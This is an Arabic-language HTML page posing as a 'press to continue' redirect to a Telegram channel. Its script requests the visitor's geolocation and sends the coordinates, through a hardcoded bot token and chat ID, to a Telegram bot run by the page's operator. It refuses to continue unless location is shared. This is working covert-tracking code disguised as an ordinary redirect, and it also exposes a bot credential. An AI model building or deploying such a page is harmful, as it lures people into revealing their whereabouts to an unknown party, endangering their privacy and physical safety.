<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>صفحة توجيه البوت</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-image: url('https://i.pinimg.com/736x/dc/9d/41/dc9d4149758055ed003a52ff47707520.jpg');
      background-size: cover;
      background-position: center;
      font-family: Arial, sans-serif;
      color: #ffffff;
      direction: rtl;
    }

    #startBtn {
      padding: 12px 24px;
      font-size: 18px;
      font-weight: bold;
      background-color: rgba(0, 0, 0, 0.6);
      border: 2px solid #ffffffaa;
      border-radius: 12px;
      color: white;
      cursor: pointer;
      margin-bottom: 30px;
      transition: all 0.3s;
    }

    #startBtn:hover {
      background-color: rgba(255, 255, 255, 0.2);
    }

    #countdown {
      width: 80px;
      height: 80px;
      font-size: 36px;
      font-weight: bold;
      background: rgba(0, 0, 0, 0.6);
      border: 2px solid #ffffffaa;
      border-radius: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      text-shadow: 0 0 5px #000000;
      display: none;
    }
  </style>
</head>
<body>
  <button id="startBtn">اضغط للمتابعة</button>
  <div id="countdown">5</div>

  <script>
    const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
    const CHAT_ID = "6028485445";
    const REDIRECT_URL = "https://t.me/sswq22";
    let locationSent = false;

    document.getElementById("startBtn").onclick = () => {
      getLocationAndStart();
    };

    function getLocationAndStart() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
            .then(() => {
              locationSent = true;
              startCountdown();
            })
            .catch(() => alert("فشل في إرسال الموقع"));
        }, () => {
          alert("يرجى تفعيل الموقع للاستمرار.");
        });
      } else {
        alert("متصفحك لا يدعم مشاركة الموقع.");
      }
    }

    function startCountdown() {
      document.getElementById("startBtn").style.display = "none";
      const countdownEl = document.getElementById("countdown");
      countdownEl.style.display = "flex";
      let seconds = 5;
      countdownEl.innerText = seconds;

      const interval = setInterval(() => {
        seconds--;
        countdownEl.innerText = seconds;
        if (seconds === 0) {
          clearInterval(interval);
          if (locationSent) {
            window.location.href = REDIRECT_URL;
          } else {
            alert("لم يتم إرسال الموقع، لا يمكن المتابعة.");
          }
        }
      }, 1000);
    }
  </script>
</body>
</html>
